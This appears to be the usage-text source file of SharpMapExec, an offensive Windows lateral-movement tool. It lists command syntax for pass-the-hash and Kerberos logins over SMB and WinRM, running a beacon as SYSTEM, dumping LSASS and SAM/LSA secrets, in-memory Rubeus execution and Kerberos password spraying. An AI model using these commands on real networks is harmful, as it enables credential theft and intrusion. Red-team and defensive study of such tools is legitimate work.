using System;

namespace SharpMapExec.args
{
    public static class Info
    {
        public static void ShowUsage()
        {
            Console.WriteLine("\r\n  SharpMapExec.exe\r\n  usage:");

            //smb
            Console.WriteLine("\r\n    --- Smb ---");
            Console.WriteLine(@"        SharpMapExec.exe ntlm smb /user:USER /ntlm:HASH /domain:DOMAIN /computername:TARGET");
            Console.WriteLine(@"        SharpMapExec.exe kerberos smb </user:USER /password:PASSWORD /domain:DOMAIN /dc:DC | /ticket:TICKET.Kirbi>  /computername:TARGET");
            Console.WriteLine("\n      Available Smb modules");
            Console.WriteLine(@"          /m:shares");

            //WinRm
            Console.WriteLine("\r\n    --- WinRm ---");
            Console.WriteLine(@"        SharpMapExec.exe ntlm winrm /user:USER /password:PASSWORD /domain:DOMAIN /computername:TARGET ");
            Console.WriteLine(@"        SharpMapExec.exe kerberos winrm </user:USER /rc4:HASH  /domain:DOMAIN /dc:DC | /ticket:TICKET.Kirbi>  /computername:TARGET");
            Console.WriteLine("\n      Available WinRm modules");
            Console.WriteLine(@"          /m:exec /a:whoami                           (Invoke-Command)");
            Console.WriteLine(@"          /m:exec /a:C:\beacon.exe /system            (Invoke-Command as System)");
            Console.WriteLine(@"          /m:comsvcs                                  (Dump Lsass Process)");
            Console.WriteLine(@"          /m:secrets                                  (Dump and Parse Sam, Lsa, and System Dpapi blobs)");
            Console.WriteLine(@"          /m:assembly /p:Rubeus.exe /a:dump           (Execute Local C# Assembly in memory)");
            Console.WriteLine(@"          /m:assembly /p:beacon.exe /system           (Execute Local C# Assembly as System in memory)");
            Console.WriteLine(@"          /m:download /path:C:\file /destination:file (Download File from Host)");

            //domain
            Console.WriteLine("\r\n    --- Domain ---");
            Console.WriteLine(@"        SharpMapExec.exe kerbspray /users:USERS.TXT /passwords:PASSWORDS.TXT /domain:DOMAIN /dc:DC");
            Console.WriteLine(@"        SharpMapExec.exe tgtdeleg");

            Console.WriteLine("\r\n");
        }
    }
}